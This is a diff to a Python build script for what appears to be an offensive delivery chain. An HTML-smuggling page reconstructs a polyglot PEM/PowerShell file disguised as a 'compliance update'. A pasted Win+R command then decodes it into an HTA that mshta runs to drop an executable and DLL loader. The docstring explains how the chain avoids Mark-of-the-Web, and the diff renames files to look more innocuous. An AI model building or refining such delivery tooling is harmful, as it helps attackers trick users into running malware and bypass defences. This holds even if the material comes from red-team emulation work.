@@ -3,8 +3,8 @@ build.py - Build the HTML-smuggling -> polyglot -> HTA delivery variant (Step 1C
 
 Chain:
     staging.html                  (HTML smuggling page, served by the operator)
-        -> reconstructs Essos_Compliance_Update.txt client-side (no server GET)
-    Essos_Compliance_Update.txt   (polyglot PEM / PowerShell, saved to Downloads)
+        -> reconstructs Essos_Compliance_Update.cer client-side (no server GET)
+    Essos_Compliance_Update.cer   (polyglot PEM / PowerShell, saved to Downloads)
         -> the user pastes the Win+R command; powershell.exe reads the file,
            base64-decodes it to %TEMP%\\Essos_Compliance_Update.bin, renames it
            to .hta and runs it with mshta.exe
@@ -17,9 +17,9 @@ carries no Mark-of-the-Web and mshta runs it in the Local Machine zone, where
 ADODB.Stream (used by the HTA to drop the loader) is not blocked.
 
 Steps:
-    1. Read EssosUpdate.exe and wsdapi.dll -> stage1.hta (ADODB drops them).
-    2. Wrap base64(stage1.hta) in a polyglot PEM/PowerShell file
-       -> Essos_Compliance_Update.txt
+    1. Read EssosUpdate.exe and wsdapi.dll -> hpsolutionsportal.hta (ADODB drops them).
+    2. Wrap base64(hpsolutionsportal.hta) in a polyglot PEM/PowerShell file
+       -> Essos_Compliance_Update.cer
     3. Base64-encode the .txt and inject it into staging.tpl.html -> staging.html
 
 Usage:
@@ -39,13 +39,13 @@ DEFAULT_TONESHELL = os.path.normpath(os.path.join(
 DEFAULT_EXE_PATH = os.path.join(DEFAULT_TONESHELL, "EssosUpdate.exe")
 DEFAULT_DLL_PATH = os.path.join(DEFAULT_TONESHELL, "build", "src", "wsdapi", "Release", "wsdapi.dll")
 
-HTA_TPL  = os.path.join(HERE, "stage1.tpl.hta")
+HTA_TPL  = os.path.join(HERE, "hpsolutionsportal.tpl.hta")
 HTML_TPL = os.path.join(HERE, "staging.tpl.html")
-HTA_OUT  = os.path.join(HERE, "stage1.hta")
-TXT_OUT  = os.path.join(HERE, "Essos_Compliance_Update.txt")
+HTA_OUT  = os.path.join(HERE, "hpsolutionsportal.hta")
+TXT_OUT  = os.path.join(HERE, "Essos_Compliance_Update.cer")
 HTML_OUT = os.path.join(HERE, "staging.html")
 
-SMUGGLED_NAME = "Essos_Compliance_Update.txt"
+SMUGGLED_NAME = "Essos_Compliance_Update.cer"
 BIN_NAME      = "Essos_Compliance_Update.bin"
 DROP_NAME     = "Essos_Compliance_Update.hta"
 
